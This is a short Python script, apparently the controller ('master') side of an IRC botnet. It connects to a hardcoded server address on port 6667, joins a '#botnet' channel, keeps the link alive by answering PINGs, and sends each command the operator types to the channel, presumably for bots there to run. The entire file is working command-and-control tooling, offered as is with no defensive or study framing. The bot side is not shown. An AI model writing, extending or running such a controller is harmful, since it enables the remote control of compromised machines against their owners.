#!/usr/bin/env python3

import os
import socket
import sys
import threading

local_ip = socket.gethostbyname(socket.gethostname())

server = "142.1.46.66"  # TODO: Dynamically set this from args.
port = 6667
channel = "#botnet"

nick = "master-" + "".join(local_ip.split("."))

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def handle_ping():
    while True:
        msg = irc.recv(1024).decode()
        if "PING" in msg:
            irc.send(f"PONG {nick}\r\n".encode())


if __name__ == "__main__":
    irc.connect((server, port))
    irc.send(f"NICK {nick}\r\n".encode())
    irc.send(f"USER {nick} {nick} {nick} :{nick}\r\n".encode())
    irc.send(f"JOIN {channel}\r\n".encode())

    handle_ping_thread = threading.Thread(target=handle_ping)
    handle_ping_thread.start()

    while True:
        command = input("Command: ")
        irc.send(f"PRIVMSG {channel} :{command}\r\n".encode())
